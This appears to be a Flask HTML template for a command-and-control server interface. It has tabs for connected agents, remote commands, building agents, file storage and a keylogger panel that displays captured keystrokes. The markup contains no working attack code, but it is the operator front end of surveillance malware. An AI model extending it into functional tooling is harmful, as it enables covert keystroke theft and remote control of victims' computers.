<!DOCTYPE html>
<html>
<head>
    <title>C2 Server GUI</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&family=Roboto+Mono&display=swap">
    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
</head>
<body>
    <div class="container">
        <!-- Tab Navigation -->
        <nav class="tab-navigation">
            <button class="tab-button active" data-tab="agents">
                <span class="material-icons">devices</span>
                Connected Agents
            </button>
            <button class="tab-button" data-tab="command">
                <span class="material-icons">terminal</span>
                Command Center
            </button>
            <button class="tab-button" data-tab="build">
                <span class="material-icons">build</span>
                Build Agent
            </button>
            <button class="tab-button" data-tab="storage">
                <span class="material-icons">folder</span>
                Storage
            </button>
            <button class="tab-button" data-tab="keylogger">
                <span class="material-icons">keyboard</span>
                Keylogger
            </button>
        </nav>

        <!-- Tab Content -->
        <div class="tab-content">
            <!-- Agents Tab -->
            <div id="agents-tab" class="tab-pane active">
                <div class="agents-container">
                    <div class="targets-panel">
                        <h2>Connected Agents</h2>
                        <div id="targets-list"></div>
                    </div>
                </div>
            </div>

            <!-- Command Tab -->
            <div id="command-tab" class="tab-pane">
                <div class="command-center">
                    <div class="agent-scroll">
                        <div class="agent-list" id="agent-list"></div>
                    </div>
                    <div class="agent-tabs" id="agent-tabs">
                        <!-- Agent tabs will be dynamically added here -->
                    </div>
                </div>
            </div>

            <!-- Build Tab -->
            <div id="build-tab" class="tab-pane">
                <div class="build-panel">
                    <h2>Build Agent</h2>
                    <!-- Build content here -->
                </div>
            </div>

            <!-- Storage Tab -->
            <div id="storage-tab" class="tab-pane">
                <div class="storage-panel">
                    <h2>File Storage</h2>
                    <div class="storage-content"></div>
                </div>
            </div>

            <!-- Keylogger Tab -->
            <div id="keylogger" class="tab-pane">
                <div class="keylogger-container">
                    <div class="keylogger-header">
                        <h2>Keylogger Control Panel</h2>
                        <div class="keylogger-actions">
                            <button onclick="startKeylogger()" class="action-button start">
                                <span class="material-icons">play_arrow</span>
                                Start
                            </button>
                            <button onclick="stopKeylogger()" class="action-button stop">
                                <span class="material-icons">stop</span>
                                Stop
                            </button>
                            <button onclick="downloadLogs()" class="action-button download">
                                <span class="material-icons">download</span>
                                Download Logs
                            </button>
                            <button onclick="clearLogs()" class="action-button clear">
                                <span class="material-icons">clear_all</span>
                                Clear Logs
                            </button>
                        </div>
                    </div>
                    <div class="keylogger-content">
                        <div class="agent-selection">
                            <select id="keylogger-agent-select">
                                <option value="">Select an agent...</option>
                            </select>
                        </div>
                        <div class="logs-container">
                            <div class="logs-header">
                                <span>Captured Keystrokes</span>
                                <div class="logs-status">
                                    <span class="status-indicator"></span>
                                    <span class="status-text">Stopped</span>
                                </div>
                            </div>
                            <div id="keylogger-output" class="logs-output"></div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="{{ url_for('static', filename='js/main.js') }}"></script>
</body>
</html>
